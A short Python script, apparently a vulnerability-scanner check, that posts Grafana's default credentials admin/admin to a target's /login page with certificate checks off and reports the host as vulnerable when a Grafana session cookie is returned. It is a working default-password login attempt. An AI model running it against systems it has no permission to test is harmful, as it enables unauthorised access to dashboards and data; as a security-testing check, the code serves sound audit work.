# coding:utf-8
import requests as req
def verify(target):
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
        "Accept": "application/json, text/javascript, */*; q=0.01",
        "Content-Type": "application/json"
    }
    action = "/login"
    payload = '{"user":"admin","password":"admin"}'
    target = target.rstrip("/")
    verfy_url = target + action
    resp = req.post(verfy_url, data=payload, headers=headers, timeout=30, verify=False, allow_redirects=False)
    if (resp.status_code == 200 and "grafana_session" in resp.headers["Set-Cookie"]) or (
            resp.status_code == 200 and "grafana_sess" in resp.headers["Set-Cookie"]): #这里登录成功会有g 和 c 的字段
        print (target + "，存在漏洞")
        return True
    return False
if __name__ == '__main__':
    verify("http://lpone/")